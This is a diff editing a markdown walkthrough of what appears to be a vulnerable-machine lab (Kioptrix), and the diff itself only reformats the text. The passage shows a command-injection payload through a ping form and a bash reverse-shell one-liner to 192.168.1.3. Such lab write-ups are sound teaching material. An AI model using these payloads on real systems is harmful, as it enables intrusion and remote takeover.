@@ -150,11 +150,9 @@ So let's go ahead and test this by trying to ping our localhost or 127.0.0.1.
 
 Okay! It seems that the ping command works and the backend php code is executing system commands. At this point, we can try to see if the php script is vulnerable to [Command Injection](https://www.owasp.org/index.php/Command_Injection).
 
-Back at the main Ping Command page, let's go ahead and type in:
+Back at the main Ping Command page, let's go ahead and type in: `127.0.0.1; id`
 
-`127.0.0.1; id`
-
-What this does, is basically tells the system to run __ping__ against our localhost machine (127.0.0.1), then run the __id__ command. Technically the "__;__" is a command separator - similar to the pipe command "__|__".
+What this does, is basically tells the system to run __ping__ against our localhost machine (127.0.0.1), then run the __id__ command. Technically the "__;__" is a command separator.
 
 <a href="/images/kiop2-4.png"><img src="/images/kiop2-4.png"></a>
 
@@ -169,7 +167,9 @@ listening on [any] 443 ...
 
 Now, let's go back to the Ping console on the website and run the following command:
 
-`127.0.0.1; bash -i >& /dev/tcp/192.168.1.3/443 0>&1`
+```
+127.0.0.1; bash -i >& /dev/tcp/192.168.1.3/443 0>&1
+```
 
 This will basically initiate a reverse TCP connection using bash.
 
